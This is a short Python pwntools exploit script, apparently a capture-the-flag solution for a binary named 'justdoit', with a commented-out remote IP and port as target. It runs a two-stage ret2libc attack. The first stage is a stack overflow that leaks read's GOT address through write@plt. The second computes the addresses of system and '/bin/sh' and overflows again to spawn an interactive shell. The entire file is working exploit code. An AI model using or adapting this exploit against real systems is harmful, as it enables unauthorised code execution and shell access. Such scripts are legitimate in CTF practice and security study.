# coding:utf8
from pwn import *

context.log_level = 'DEBUG'
p = process('./justdoit')
# p = remote('163.172.176.29', 9036)

READ_GOT = 0x0804a00c
WRITE_PLT = 0x08048370
MAIN_ADDR = 0x0804847d

READ_OFFSET = 0x000d4350
SYSTEM_OFFSET = 0x0003a940
BINSH_OFFSET = 0x015900b

# LOCAL
# READ_OFFSET = 0x00E6060
# SYSTEM_OFFSET =0x0003CC50
# BINSH_OFFSET = 0x17a80a


p.recvuntil("pwners, \n")
payload = "A" * 112
payload += p32(WRITE_PLT)
payload += p32(MAIN_ADDR)
payload += p32(0x1)
payload += p32(READ_GOT)
payload += p32(0x4)
p.recv()
p.sendline(payload)
READ_LIBC = u32(p.recv(4))
LIBC_BASE = READ_LIBC - READ_OFFSET
SYSTEM = LIBC_BASE + SYSTEM_OFFSET
BINSH = LIBC_BASE + BINSH_OFFSET

print "SYSTEM :" + hex(SYSTEM)
print "BINSH :" + hex(BINSH)

p.recvuntil("pwners, \n")
payload = "A" * 104
payload += p32(SYSTEM)
payload += "JUNK"
payload += p32(BINSH)

p.sendline(payload)

p.interactive()
